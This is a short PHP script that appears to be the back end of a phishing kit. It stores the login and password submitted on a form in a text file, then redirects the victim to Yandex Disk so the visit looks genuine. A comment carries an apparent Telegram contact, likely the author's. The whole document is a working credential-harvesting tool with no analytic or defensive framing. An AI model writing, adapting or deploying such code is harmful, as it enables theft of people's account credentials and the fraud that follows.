<?PHP
$Login = $_POST['login'];
$Passwd = $_POST['passwd'];
$data = fopen("database.txt","at");
fwrite($data,"$Login:$Passwd");
fclose($data);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://disk.yandex.ru/'></head></html>";
/*Telegram
@hadariel*/
?>
